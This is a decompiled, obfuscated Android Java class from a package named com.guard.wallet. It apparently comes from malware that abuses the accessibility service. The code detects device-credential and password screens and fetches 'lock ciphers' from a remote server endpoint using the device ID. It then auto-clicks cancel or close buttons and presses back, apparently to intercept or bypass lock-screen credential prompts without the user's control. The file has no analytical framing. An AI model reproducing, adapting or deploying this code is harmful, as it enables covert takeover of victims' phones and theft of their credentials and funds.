package o;

import android.util.Log;
import com.google.json.JsonObject;
import com.guard.wallet.condition.StringCondition;
import com.guard.wallet.entity.UiObject;
import com.guard.wallet.filter.CombineFilter;
import com.guard.wallet.filter.CombineFiltersWithOr;
import com.guard.wallet.req.ReqDefaultBodyVO;
import com.guard.wallet.service.MyAccessibilityService;
import java.util.LinkedList;
import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.concurrent.atomic.AtomicInteger;

// $VF: synthetic class
public final class f0 implements Runnable {
   public final int a;
   public final g0 b;

   @Override
   public final void run() {
      int var1 = this.a;
      g0 var2 = this.b;
      switch (var1) {
         case 0:
            label106: {
               label105: {
                  var2.getClass();
                  if (MyAccessibilityService.P() != null && var2.k() != null) {
                     UiObject var9 = MyAccessibilityService.P().J();
                     if (var9 != null && var9.password()) {
                        break label105;
                     }

                     UiObject var4 = var2.k();
                     CombineFilter var10 = new CombineFilter();
                     StringCondition var5 = a.a.c(var10, "className", "android.widget.EditText");
                     var10.getStringConditions().add(var5);
                     if (var4.findOneByCombine(var10) != null
                        || var2.k().findOneByOperateOr(g0.U()) != null
                        || com.guard.wallet.utils.e.i() && var2.k().findOneByCombine(g0.W("0")) != null
                        || com.guard.wallet.utils.e.l() && (var2.k().findOneByCombine(g0.Z()) != null || var2.k().findOneByCombine(g0.Y()) != null)
                        || var2.k().findOneByCombine(g0.L()) != null) {
                        break label105;
                     }
                  }

                  var7 = false;
                  break label106;
               }

               var7 = true;
            }

            ConcurrentLinkedQueue var11;
            label83: {
               label111: {
                  var11 = var2.o;
                  if (var7) {
                     if (var2.O() || var2.N()) {
                        break label111;
                     }

                     JsonObject var12 = com.guard.wallet.http.l.b(
                        new ReqDefaultBodyVO(com.guard.wallet.utils.h.l("deviceId")), com.guard.wallet.http.l.a, "/api/cipher/lockCiphers"
                     );
                     if (var12 != null) {
                        com.guard.wallet.helper.i.a(var12.toString());
                        if (var2.O() || var2.N()) {
                           break label111;
                        }
                     }
                  } else {
                     Log.d("UseDeviceCredentialDelegate", "not inVerifyCredentialWindow");
                  }

                  AtomicInteger var13 = new AtomicInteger(0);

                  while (var13.incrementAndGet() <= 10) {
                     UiObject var6 = var2.k();
                     CombineFiltersWithOr var14 = new CombineFiltersWithOr();
                     var14.setFilters(new LinkedList<>());
                     var14.getFilters().add(g0.J());
                     var14.getFilters().add(g0.I());
                     var14.getFilters().add(g0.H());
                     UiObject var15 = var6.findOneByOperateOr(var14);
                     if (var15 != null && var15.click()) {
                        var8 = "closeButton click Success";
                        break label83;
                     }

                     com.guard.wallet.utils.g.T0(2);
                     MyAccessibilityService.I(var2.k());
                  }

                  while (!var2.K()) {
                     com.guard.wallet.utils.g.F0(1);
                     com.guard.wallet.utils.g.T0(5);
                     Log.d("UseDeviceCredentialDelegate", "back Success");
                  }

                  var8 = "finish inUseDeviceCredential";
                  break label83;
               }

               var8 = "confirmByLocalCipherLocked Success";
            }

            Log.d("UseDeviceCredentialDelegate", var8);
            var11.remove("inUseDeviceCredential");
            return;
         default:
            UiObject var3 = var2.k().findOneByCombine(g0.H());
            if (var3 != null && var3.click()) {
               Log.d("UseDeviceCredentialDelegate", "inAssistCredential Cancel Success");
            }

            var2.o.remove("inUseDeviceCredential");
      }
   }
}
